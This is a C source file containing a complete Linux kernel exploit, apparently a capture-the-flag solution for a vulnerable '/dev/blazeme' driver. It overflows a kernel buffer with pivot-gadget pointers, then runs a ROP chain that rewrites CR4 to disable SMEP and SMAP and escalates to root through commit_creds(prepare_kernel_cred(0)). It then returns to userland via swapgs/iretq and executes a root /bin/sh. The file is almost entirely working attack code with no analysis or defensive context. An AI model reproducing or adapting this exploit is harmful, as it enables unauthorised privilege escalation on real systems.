#include <stdio.h>
#include <sys/mman.h>
#include <errno.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>


#define KBUF_LEN 0x40ul
#define CR4_DESIRED_VALUE 0x6f0ul

typedef unsigned long __attribute__((regparm(3)))(*commit_creds_func)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3)))(*prepare_kernel_cred_func)(unsigned long cred);
commit_creds_func commit_creds = (commit_creds_func)0xffffffff81063960;
prepare_kernel_cred_func prepare_kernel_cred = (prepare_kernel_cred_func)0xffffffff81063b50;
unsigned long pivot=0xffffffff8109c604;//mov esp, 0x1740000; ret
unsigned long poprdi=0xffffffff81309e6d;
unsigned long native_write_cr4=0xffffffff8103b840;
unsigned long swapgs_poprbp=0xffffffff8103b904;
unsigned long iretq_poprbp=0xffffffff8101cf06;

void get_root(){
	commit_creds(prepare_kernel_cred(0));
}

void get_shell(){
	puts("[+] SMEP and SMAP bypassed!");
	if(!getuid()){
		puts("[+] Priv esc successful!");
		puts("[+] Here's your root shell!");
		char *args[]={"/bin/sh",NULL};
		execve("/bin/sh",args,NULL);
	}
	else{
		perror("privilage escalation fail");
		exit(0);
	}
}
unsigned long user_cs,user_ss,user_rflags,user_rsp;
static void save_state()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %3\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp)
        :
        : "memory");
}

void exploit(){
	printf("[+] commit_creds= %p\n",(unsigned long *)commit_creds);
	printf("[+] prepare_kernel_cred= %p\n",(unsigned long *)prepare_kernel_cred);
	printf("[+] native_write_cr4= %p\n",native_write_cr4);
	save_state();
	char payload[KBUF_LEN];
	memset(payload,0xff,sizeof(payload));
	unsigned long pointers[KBUF_LEN/8];
	int fd=open("/dev/blazeme",O_RDWR);
	for(int i=0;i<KBUF_LEN/8;i++){
		pointers[i]=pivot;
	}		
	mmap((void *)0x173d000,0x6000,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
	unsigned long ropchain[]={poprdi,CR4_DESIRED_VALUE,native_write_cr4,//disable smep/smap
				  get_root,//escalate privs
				  swapgs_poprbp,0,iretq_poprbp,get_shell,user_cs,user_rflags,user_rsp,user_ss};//clean exit annd root shell
	memset((void *)0x173d000,0,0x6000);
	memcpy((void *)0x1740000,(const void *)ropchain,sizeof(ropchain));
	memcpy(payload+2,(const char *)pointers,KBUF_LEN-2);
	while(1){
		write(fd,payload,KBUF_LEN);
	}
}

int main(){
	exploit();
}
